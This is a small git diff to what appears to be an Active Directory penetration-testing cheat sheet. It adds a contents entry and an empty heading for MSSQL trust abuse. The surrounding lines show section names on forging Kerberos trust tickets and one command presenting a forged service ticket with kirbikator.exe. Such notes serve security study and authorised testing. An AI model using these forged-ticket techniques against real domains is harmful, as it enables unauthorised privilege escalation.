@@ -34,6 +34,7 @@ Last update: **23 Nov 2021**
   -  [Child to Parent using Trust Tickets](#Child-to-Parent-using-Trust-Tickets)
   -  [Child to Parent using Krbtgt Hash](#Child-to-Parent-using-krbtgt-hash)
   -  [Across Forest using Trust Tickets](#Across-forest-using-trust-tickets)
+- [Trust Abuse - MSSQL Servers](#Trust-Abuse-MSSQL-Servers)
 
 ## Pre-requisites
 ### Using PowerView:
@@ -634,3 +635,5 @@ forged trust ticket:**
 # Present the TGS
 .\kirbikator.exe lsa .\CIFS.eurocorp-dc.corporate.local.kirbi
 ```
+
+# Trust Abuse - MSSQL Servers
